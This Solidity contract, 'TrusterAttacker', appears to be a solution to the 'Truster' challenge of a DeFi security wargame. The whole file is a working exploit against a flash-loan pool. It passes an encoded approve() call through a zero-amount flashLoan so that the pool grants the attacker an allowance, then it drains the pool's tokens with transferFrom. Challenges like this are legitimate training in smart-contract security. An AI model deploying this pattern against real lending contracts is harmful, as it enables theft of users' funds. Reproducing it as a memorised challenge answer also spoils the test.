// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttacker {
    constructor(
        uint256 amount,
        address poolAddress,
        address tokenAddress
    ) {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        TrusterLenderPool(poolAddress).flashLoan(0, msg.sender, tokenAddress, data);
        IERC20(tokenAddress).transferFrom(poolAddress, msg.sender, amount);
    }
}
